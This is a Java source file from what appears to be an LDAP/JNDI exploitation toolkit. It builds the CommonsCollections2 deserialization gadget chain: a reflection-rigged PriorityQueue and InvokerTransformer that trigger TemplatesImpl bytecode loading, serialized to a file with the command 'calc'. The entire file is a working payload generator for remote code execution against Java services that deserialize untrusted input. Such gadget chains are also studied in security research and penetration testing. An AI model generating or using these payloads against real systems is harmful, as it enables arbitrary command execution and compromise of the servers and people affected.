package com.feihong.ldap.gadgets;

import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.gadgets.utils.Gadgets;
import com.feihong.ldap.gadgets.utils.Reflections;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;

public class CommonsCollections2 {
    public static void main(String[] args) throws Exception {
        byte[] bytes = getBytes(PayloadType.command, "calc");
        FileOutputStream fous = new FileOutputStream("6666.ser");
        fous.write(bytes);
        fous.close();
    }

    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        final Object tpl = Gadgets.createTemplatesImpl(type, param);

        // mock method name until armed
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));

        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        // switch method called by comparator
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = tpl;
        queueArray[1] = 1;

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);
        oos.writeObject(queue);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}
